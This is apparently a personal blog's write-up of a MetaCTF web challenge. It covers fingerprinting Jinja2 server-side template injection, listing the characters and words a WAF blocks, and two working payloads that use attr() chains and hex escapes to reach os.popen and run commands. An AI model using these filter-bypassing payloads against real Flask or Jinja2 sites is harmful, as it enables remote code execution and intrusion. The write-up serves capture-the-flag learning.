<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Mctf_template_fury</title>

  <link rel="shortcut icon" type="image/x-icon" href="/assets/imgs/favicon.ico" />
  <link rel="stylesheet" href="/assets/css/styles.css">
</head>
<body a="dark">
		<div class="site-wrapper">
		<header>
			<a href="/" class="site-title-link"><h1>bontalor</h1></a><nav>
  <a href="/" class="">Home</a> 
  <a href="/certifications" class="">Certs</a>
  <a href="/blogs" class="">Blogs</a>
  <a href="/writeups" class="active">Writeups</a>
  <a href="/all" class="">All</a>
</nav>
</header>
		<main class="page-content" aria-label="Content">
			<div class="w">
				<a class="back" onclick="goBack()">. . /</a>
<article>
  <p class="post-meta">
    <time datetime="2025-10-16 00:00:00 +0000">10-16-2025</time>
  </p>
  
  <h1>mctf_template_fury</h1>

  <p><img src="/assets/imgs/2025-10-17-mctf-template-title-card.png" alt=""></p>

<h2 id="background">Background</h2>

<p><em>Template Fury</em> is a web exploitation challenge by MetaCTF. The challenge involves unsanitized input with a weak WAF.</p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-1.png" alt=""></p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-2.png" alt=""></p>

<h2 id="recon">Recon</h2>

<p>Based on the name I assume this is an SSTI (server-side template injection) exploit.</p>

<p>Using this helpful chart I found on <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener noreferrer">PortSwigger</a> I can get an idea of which template is being used and how to exploit it.</p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-3.png" alt=""></p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-4.png" alt=""></p>

<h2 id="exploitation">Exploitation</h2>

<p>This confirms SSTI is possible and the template is Jinja2 because the output of <code>{{7*'7'}}</code> is <code>7777777</code>. If the output is <code>49</code> the template is Twig.</p>

<p>Now I search online and find a <a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/" target="_blank" rel="noopener noreferrer">onsecurity</a> writeup about Jinja2 SSTI and try a payload.</p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-5.png" alt=""></p>

<p>After some trial and error I deduce that the WAF (web application firewall) blocks the following:</p>

<p><code>.</code>
<code>_</code>
<code>[</code>
<code>]</code>
<code>builtins</code>
<code>import</code>
<code>os</code>
<code>popen</code></p>

<p>The writeup with the payload I used also includes some payloads if <code>.</code> <code>_</code> <code>[</code> and <code>]</code> are forbidden.</p>

<p>It uses <code>attr()</code> to bypass <code>.</code> <code>[</code> and <code>]</code> and uses the HTML entity <code>\x5f</code> instead of <code>_</code> .</p>

<pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
</code></pre>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-6.png" alt=""></p>

<p>Since some terms are still forbidden I try encoding the forbidden terms as HTML entities as well.</p>

<pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}
</code></pre>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-7.png" alt=""></p>

<p>The command <code>id</code> works and confirms I can execute commands, now I just need to find and read the flag.</p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-8.png" alt=""></p>

<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-9.png" alt=""></p>

<p>pce,<br>
bonta</p>

</article>
<link rel="stylesheet" href="/assets/css/windows-high-contrast.min.css">
<script src="/assets/js/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

			</div>
		</main>
		<script src="/assets/js/goback.js"></script>  <footer class="sticky-footer">
    <p>
      <a class="foot-link" href="https://github.com/bontalor/bonta.lor.moe/commit/5b1cfe7" target="_blank" rel="noopener noreferrer">
        ▖▌▖▘▘▖▌▘▘▖▘▘▌▘▘▘▘
      </a> / made by bonta with &lt;3
    </p>
  </footer>


</div>
	</body>
</html>
